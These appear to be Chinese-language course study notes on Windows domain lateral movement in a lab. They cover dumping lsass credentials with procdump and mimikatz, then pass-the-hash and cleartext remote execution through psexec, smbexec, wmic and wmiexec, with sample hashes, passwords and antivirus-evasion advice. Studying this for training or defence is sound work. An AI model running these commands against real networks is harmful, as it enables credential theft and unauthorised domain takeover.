# 2026-08-31 内网安全③：域横向移动——SMB/WMI 传递（psexec、smbexec、wmic、wmiexec）

> 状态：🧪 理论（课程截图，08-31 课程），待实操
> 承接 08-30(续2) 第二课：上节课学了「传递」分支的 **at&schtasks**（计划任务），这节课学剩下的 **smb&wmi** 两路——SMB 服务（psexec/smbexec，445 端口）和 WMI 服务（wmic/wmiexec，135 端口），外加配套知识点：**为什么拿不到明文密码（wdigest）** 和 **LM/NTLM Hash 背景**。

## 一、一句话认知

域横向移动 = **凭据传递**：拿下一台主机后，用已有的明文密码 / NTLM Hash 通过不同服务协议在别的机器上远程执行命令。这课新增两条路——**SMB(445)** 和 **WMI(135)**；而「拿不到明文密码」是常态（wdigest 关闭），所以 **HASH 传递（PTH）** 和 **hashcat 破解** 才是主力。

## 二、知识点1：为什么拿不到明文密码（wdigest）——4 种对策

| 系统状态 | 能否从内存拿明文 |
|----------|------------------|
| Win2012 **以上** | 默认关闭 wdigest → 拿不到 |
| Win2012 以下，但装了 **KB2871997** 补丁 | 同样拿不到 |

> 所以 mimikatz `sekurlsa::logonPasswords` 常掏出来的是 **HASH** 而不是明文——这就是为什么要学 HASH 传递。

**4 种解决方式**（课程原话）：
1. **利用哈希 hash 传递（pth，ptk 等）进行移动** ← 本课重点（PTH 实操）
2. **利用其它服务协议（SMB，WMI 等）进行哈希移动** ← 本课重点（-hashes 传 hash）
3. **利用注册表操作开启 wdigest Auth 值进行获取**（❓ 课程没展开具体命令，待查）
4. **利用工具或第三方平台（Hachcat）进行破解获取**（hash 拿到后本地 GPU 跑——宿主机 hashcat 6.2.6 可干这事）

## 三、知识点2：LM Hash vs NTLM Hash

- **个人系统在 Windows Vista 以后**，**服务器系统在 Windows 2003 以后**，认证方式均为 **NTLM Hash**
- LM Hash = 老算法（DES 分块 + 大写化 + 无 salt，脆弱）；NTLM Hash = MD4(UTF-16LE(密码))，不可逆
- 横向传递 / PTH 里用的都是 **NTLM Hash**（32 位 hex，如 `518b98ad4178a53695dc997aa02d455c`）
- 只有打老机器（XP/2003 及更早）才可能碰到 LM Hash 的坑（❓ 具体细节待查）

## 四、传递分类总览（导图）

```
传递
├── 明文 ── at&schtasks / smb&wmi ──► 官方的工具（功能少，不用免杀）
└── HASH ── at&schtasks / smb&wmi ──► impacket（功能多，考虑免杀）
                          │
                          ▼
                      PTH, PTL, PTK
```

- 同一套服务（at/计划任务、SMB、WMI），**明文**用官方工具直接传；**HASH** 就得靠 impacket 套件（功能多、操作简单、**容易被杀**）
- PTH（pass the hash）/ PTL（pass the ticket）/ PTK（pass the key）是 HASH 传递的三种变体——本课只实操了 PTH（❓ PTL/PTK 待后续课）

## 五、案例1：凭据获取——Procdump + Mimikatz 配合

内存里拿不到明文怎么办？**先 dump，再离线分析**——mimikatz 本体容易被杀，procdump 是微软官方签名工具：

```cmd
procdump -accepteula -ma lsass.exe lsass.dmp   # -accepteula 接受许可协议；-ma 全量内存 dump
```

mimikatz 上执行（离线读 dump，不在目标机上实时操作）：

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```

- 其他 dump 工具（课程只列了名字没展开）：**Pwdump7**、**QuarksPwdump**
- 意义：dump 文件可以拷回本地慢慢分析，且规避杀软对 mimikatz 的实时查杀

## 六、案例2：域横向移动 SMB 服务利用——psexec、smbexec（445）

> 利用 SMB 服务可以通过**明文或 hash 传递**来远程执行命令，**条件：445 端口开放**。

### psexec 第一种：先有 IPC 链接（官方 Sysinternals 工具）

```cmd
net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator   # 先建 IPC（复用上节课手法）
psexec \\192.168.3.32 -s cmd                                    # -s 以 System 权限运行
```

### psexec 第二种：不用建立 IPC，直接提供明文账户密码

```cmd
psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd
```

### psexec hash 传递（impacket 版，非官方自带，操作简单容易被杀）

```cmd
psexec -hashes :$HASH$ ./administrator@10.1.2.3
psexec -hashes :$HASH$ domain/administrator@10.1.2.3
psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
```

### smbexec：无需 IPC 链接，明文或 hash 传递（impacket 格式）

```cmd
smbexec god/administrator:Admin12345@192.168.3.21                 # 明文：域/用户:密码@IP
smbexec ./administrator:admin!@#45@192.168.3.32                   # ./ = 当前域/本地
smbexec -hashes :$HASH$ ./admin@192.168.3.21                      # PTH
smbexec -hashes :$HASH$ domain/admin@192.168.3.21                 # PTH 域内（课程截图笔误写成 smbbexec）
smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
```

> ❓ 课程标题写 psexec/smbexec「官方自带」，但 smbexec 命令明显是 impacket 格式——我的理解：psexec 官方版（IPC / -u -p 两种）不用免杀；带 `-hashes` 的 psexec/smbexec 是 impacket 套件（截图末尾也标注「非官方自带-参考 impacket 工具包使用」）。实操时注意区分来源。

## 七、案例3：域横向移动 WMI 服务利用——cscript、wmiexec、wmic（135）

> WMI 通过 **135 端口**利用，支持**用户名明文或 hash** 认证，且**不会在目标日志系统留下痕迹**（相比 SMB/计划任务更隐蔽；❓ 开启完整审计时 WMI 其实也有 Event ID 可查，待实操验证）。

### 自带 wmic 明文传递：无回显

```cmd
wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create "cmd.exe /c ipconfig >C:\1.txt"
```

- 无回显 = 命令执行结果不直接显示，把输出**重定向写到目标机文件**（`>C:\1.txt`），再自己读回来
- 格式：`/node:目标IP` + `/user` + `/password` + `process call create "要执行的命令"`

### 自带 cscript 明文传递：有回显

```cmd
cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
```

- cscript 是系统自带脚本宿主，wmiexec.vbs 是配套脚本文件；`/shell` 直接进交互式 shell，**有回显**

### 套件 impacket wmiexec：明文或 hash 传递，有回显（exe 版本）

```cmd
wmiexec ./administrator:admin!@#45@192.168.3.32 "whoami"           # 明文本地/当前域
wmiexec god/administrator:Admin12345@192.168.3.21 "whoami"         # 明文域内
wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"   # PTH
wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami" # PTH 域内
```

## 八、工具选型对比（回答上节课疑问：psexec 系 vs atexec）

| 工具 | 走的服务/端口 | 官方/impacket | 有无回显 | 支持 HASH | 免杀 |
|------|--------------|--------------|---------|----------|------|
| at / schtasks | 计划任务（IPC 445） | 官方 | 无 | 明文 | 不用 |
| atexec | 计划任务 | impacket | 有 | 明文 + hash | 考虑 |
| psexec 官方版 | SMB 445 | Sysinternals 官方 | 有（shell） | 明文（-u -p） | 不用 |
| psexec / smbexec（impacket） | SMB 445 | impacket | 有 | 明文 + hash（-hashes） | 考虑 |
| wmic | WMI 135 | 官方 | 无 | 明文 | 不用 |
| cscript + wmiexec.vbs | WMI 135 | 官方脚本宿主 | 有 | 明文 | 不用 |
| wmiexec（impacket） | WMI 135 | impacket | 有 | 明文 + hash | 考虑 |

**场景怎么选**：
- 目标开 **445** → SMB 系（psexec 官方免杀 / impacket 版能传 hash）
- 目标开 **135** 且想**隐蔽**（不留日志）→ WMI 系
- 手里只有 **HASH** 没有明文 → impacket 系（`-hashes :<NTLM hash>`）
- 怕被杀 → 官方工具 + 明文密码；能接受免杀成本 → impacket（功能多、一条命令）

## 九、总结：内网安全③地图

| 板块 | 内容 |
|------|------|
| 知识点1 | wdigest 关闭（2012+/KB2871997）→ 拿不到明文 → 4 种对策（PTH / 服务协议 hash / 注册表开 wdigest / hashcat） |
| 知识点2 | LM Hash（Vista/2003 前）→ NTLM Hash（现代）；PTH 用的是 NTLM Hash |
| 案例1 | Procdump dump lsass → mimikatz 离线分析（sekurlsa::minidump + logonPasswords full） |
| 案例2 | SMB 445：psexec 官方（先 IPC / -u -p 两种）+ impacket psexec/smbexec -hashes |
| 案例3 | WMI 135：wmic（无回显写文件）/ cscript wmiexec.vbs（有回显）/ impacket wmiexec（明文+hash） |
| 选型 | 明文→官方免杀；hash→impacket 考虑免杀；445→SMB 系，135→WMI 系 |

**一句话串起来**：横向移动的「发射架」从 at&schtasks（上节课）扩展到了 **SMB 和 WMI 两条新路**——官方工具吃明文、impacket 吃 hash；而 wdigest 关闭决定了 **hash 传递才是常态**，凭据获取（Procdump+Mimikatz）和破解（hashcat）是 hash 的两大来源。

## 疑问

1. ❓ 知识点1 第 3 条「注册表操作开启 wdigest Auth 值」具体怎么操作？（注册表路径 / UseLogonCredential 值 / 是否需重启）——课程只列了方案没展开
2. ❓ PTL / PTK 具体是什么？（导图提到 PTH/PTL/PTK，本课只实操了 PTH——pass the ticket / pass the key 的场景）
3. ❓ WMI「不会在目标日志留下痕迹」真的吗？开启完整审计（4688/4648）时 WMI 执行命令有没有日志？（防御视角验证）
4. ❓ LM Hash 的算法细节？什么年代的系统还会碰到？（老机器横向的坑）
5. ❓ smbexec 到底算官方还是 impacket？（课程标题写官方自带，命令却是 impacket 格式）——实操时用 impacket 版验证

## 关联笔记

- [2026-08-30(续2)-内网安全-域横向渗透.md](./2026-08-30(续2)-内网安全-域横向渗透.md) — 第一课 at&schtasks/atexec：本课是「传递」分支的 smb&wmi 路；IPC 错误码速查表继续适用
- [2026-08-30(续)-内网安全-基本认知与信息收集.md](./2026-08-30(续)-内网安全-基本认知与信息收集.md) — 凭据（明文/HASH/域用户列表）来源 + 实验环境拓扑（3.21 域控 / 3.32 sqlserver）
- [加解密算法与编码.md](./加解密算法与编码.md) — LM/NTLM Hash 算法背景（知识点2 的底层）
- [2026-08-28(续2)-Kioptrix1靶机渗透实战.md](./2026-08-28(续2)-Kioptrix1靶机渗透实战.md) — SMB 枚举实操（横向前提：摸清目标）

## 待实践

- 案例1：实验机跑 procdump dump lsass → mimikatz 离线分析（sekurlsa::minidump + logonPasswords full）
- 案例2：psexec 官方两种方式（先 IPC / -u -p）打 3.21/3.32；impacket psexec/smbexec -hashes 验证 PTH
- 案例3：wmic 无回显写 C:\1.txt 再读回；cscript wmiexec.vbs 进 shell；wmiexec.exe 明文/hash 各打一遍
- 同一台机器对比 atexec / wmiexec / smbexec 三者的实际表现（回显、日志、是否被杀）
- 验证疑问 3：目标机开审计策略后 WMI 执行有没有日志

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
